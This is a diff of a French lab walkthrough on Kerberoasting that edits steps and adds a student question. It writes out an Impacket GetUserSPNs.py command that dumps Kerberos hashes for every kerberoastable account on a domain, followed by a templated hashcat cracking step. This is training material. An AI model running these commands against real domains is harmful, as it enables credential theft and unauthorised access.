@@ -72,8 +72,11 @@ Les versions d'Impacket sont instables depuis la 0.9.20. Je suggère d'avoir une
 
 1.) ```cd /usr/share/doc/python3-impacket/examples/ - accédez à l'emplacement de GetUserSPNs.py```
 
-2.) ```sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request``` - cela videra le hachage Kerberos pour tous les comptes kerberoastable qu'il peut trouver sur le domaine cible, comme le fait Rubeus.   
+2.) ```sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip MACHINE_IP -request``` - cela videra le hachage Kerberos pour tous les comptes kerberoastable qu'il peut trouver sur le domaine cible, comme le fait Rubeus.
+
 Cependant, cela ne doit pas nécessairement être sur la machine cible et peut être effectué à distance.
+
+**_Quelles différences constatez vous entre les résultat de Rubeus et d'Impacket ?_**
 
 3.) ```hashcat -x nnnnn -x n aaaaa bbbbb``` -  cracker ce hachage  
     ```Usage: hashcat [options]... hash|hashfile dictionaryfile```  
